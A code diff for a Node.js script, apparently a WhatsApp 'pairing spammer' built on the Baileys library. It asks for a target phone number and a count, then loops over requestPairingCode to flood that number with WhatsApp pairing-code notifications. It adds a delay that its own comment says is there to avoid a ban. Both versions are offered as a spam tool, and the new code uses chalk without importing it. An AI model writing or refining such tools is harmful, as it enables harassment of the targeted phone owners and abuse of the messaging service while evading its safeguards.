@@ -1,20 +1,10 @@
-const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
+const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");
 const pino = require('pino');
 const readline = require("readline");
 
-
-    const color = [
-        '\x1b[31m', 
-        '\x1b[32m', 
-        '\x1b[33m', 
-        '\x1b[34m', 
-        '\x1b[35m', 
-        '\x1b[36m', 
-        '\x1b[37m',
-        '\x1b[90m' 
-    ];
-    const xeonColor = color[Math.floor(Math.random() * color.length)];
-
+// Colors for Terminal
+const color = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
+const xeonColor = color[Math.floor(Math.random() * color.length)];
 const xColor = '\x1b[0m';
 
 const question = (text) => {
@@ -22,52 +12,54 @@ const question = (text) => {
     return new Promise((resolve) => { rl.question(text, resolve) });
 };
 
-async function XeonProject() {
-    const { state } = await useMultiFileAuthState('./shyam/session');
-    const HansTechInc = makeWASocket({
+async function ShyamPairing() {
+    // Session path
+    const { state, saveCreds } = await useMultiFileAuthState('./shyam/session');
+    
+    const sock = makeWASocket({
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
         auth: state,
-        connectTimeoutMs: 60000,
-        defaultQueryTimeoutMs: 0,
-        keepAliveIntervalMs: 10000,
-        emitOwnEvents: true,
-        fireInitQueries: true,
-        generateHighQualityLinkPreview: true,
-        syncFullHistory: true,
-        markOnlineOnConnect: true,
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
-    try {
-        // Ask for phone number
-        const phoneNumber = await question(xeonColor + 'Enter target number🤙 : ' + xColor);
-        
-        // Request the desired number of pairing codes
-        const xeonCodes = parseInt(await question(xeonColor + 'Amount 😽 : '+ xColor));
 
-        if (isNaN(xeonCodes) || xeonCodes <= 0) {
-            console.log('example : 20.');
+    console.log(xeonColor + `
+╔═╗╦ ╦╦ ╦╔═╗╔╦╗  ╔═╗╔═╗╦╦═╗╦╔╗╔╔═╗
+╚═╗╠═╣╚╦╝╠═╣║║║  ╠═╝╠═╣║╠╦╝║║║║║ ╦
+╚═╝╩ ╩ ╩ ╩ ╩╩ ╩  ╩  ╩ ╩╩╩╚═╩╝╚╝╚═╝ V2
+    ` + xColor);
+
+    try {
+        const phoneNumber = await question(xeonColor + 'Enter target number (ex: 917384287404): ' + xColor);
+        const amount = parseInt(await question(xeonColor + 'How many codes to send? : '+ xColor));
+
+        if (isNaN(amount) || amount <= 0) {
+            console.log(chalk.red('Invalid Amount!'));
             return;
         }
 
-        // Get and display pairing code
-        for (let i = 0; i < xeonCodes; i++) {
+        console.log(chalk.cyan(`\n🚀 Starting Pairing Spammer on ${phoneNumber}...\n`));
+
+        for (let i = 0; i < amount; i++) {
             try {
-                let code = await Shyam.requestPairingCode(phoneNumber);
+                // Requesting pairing code from WhatsApp
+                let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''));
                 code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(xeonColor + `${phoneNumber} [${i + 1}/${xeonCodes}]`+ xColor);
-            } catch (error) {
-                console.error('Error:', error.message);
+                
+                console.log(chalk.green(`[${i + 1}] Code Sent: `) + chalk.white.bold(code));
+                
+                // Small delay to prevent instant ban
+                await delay(2000); 
+            } catch (err) {
+                console.log(chalk.red(`Error at attempt ${i+1}: `) + err.message);
             }
         }
+        console.log(chalk.yellow("\n✅ Task Completed!"));
+        process.exit(0);
+
     } catch (error) {
-                 console.error('error') ;
+        console.error('Fatal Error:', error);
+    }
 }
 
-    return HansTechInc.;
-}
-console.log(xeonColor + `═╗ ╦┌─┐┌─┐┌┐┌  ╔═╗┌─┐┌─┐┌┬┐  ╔╗╔┌─┐┌┬┐┬┌─┐┬┌─┐┌─┐┌┬┐┬┌─┐┌┐┌
-╔╩╦╝├┤ │ ││││  ╚═╗├─┘├─┤│││  ║║║│ │ │ │├┤ ││  ├─┤ │ ││ ││││
-╩ ╚═└─┘└─┘┘└┘  ╚═╝┴  ┴ ┴┴ ┴  ╝╚╝└─┘ ┴ ┴└  ┴└─┘┴ ┴ ┴ ┴└─┘┘└┘` + xColor);
-
-XeonProject();
+ShyamPairing();
